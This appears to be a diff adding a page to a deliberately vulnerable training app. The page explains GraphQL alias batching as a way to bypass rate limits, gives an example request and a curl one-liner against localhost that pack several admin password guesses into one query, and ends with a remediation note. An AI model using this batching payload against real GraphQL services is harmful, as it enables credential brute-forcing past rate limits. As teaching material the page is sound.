@@ -1,0 +1,35 @@
+{% extends 'base.html' %}
+{% block title %}GraphQL Alias Batching{% endblock %}
+{% block content %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p2">P2</span>
+    <h2>GraphQL Alias Batching — Rate Limit Bypass</h2>
+    <p class="mono-dim">OWASP API4 · N credential checks in 1 HTTP request · Rate limiter sees 1 call</p>
+  </div>
+  <div class="vuln-info">
+    <b>Distinct from array batching</b> (list of operations) and <b>depth DoS</b> (nested fields).
+    A single query body with multiple <em>aliased</em> field resolutions executes each one
+    independently. A rate limiter counting HTTP requests sees <code>1</code>;
+    the server performs <code>N</code> credential checks.
+  </div>
+  <div class="hint-box">
+    <b>Example — 3 password guesses in 1 request:</b>
+    <pre class="result-block">POST /api/v5/graphql/alias-batch
+Content-Type: application/json
+
+{
+  "query": "{ a1: checkLogin(username:\"admin\", password:\"pass1\") { ok }
+             a2: checkLogin(username:\"admin\", password:\"aegis2024\") { ok }
+             a3: checkLogin(username:\"admin\", password:\"pass3\") { ok } }"
+}</pre>
+    <b>curl one-liner:</b>
+    <pre class="result-block">curl -s -X POST http://localhost:5000/api/v5/graphql/alias-batch \
+  -H "Content-Type: application/json" \
+  -H "Cookie: session=&lt;your-cookie&gt;" \
+  -d '{"query":"{ a1: checkLogin(username:\"admin\", password:\"aegis2024\") { ok } a2: checkLogin(username:\"admin\", password:\"wrong\") { ok } }"}'</pre>
+    <b>Remediation:</b> Count alias fields server-side and enforce a per-request alias cap.
+    Most GraphQL frameworks support query complexity / alias limits as middleware.
+  </div>
+</div>
+{% endblock %}
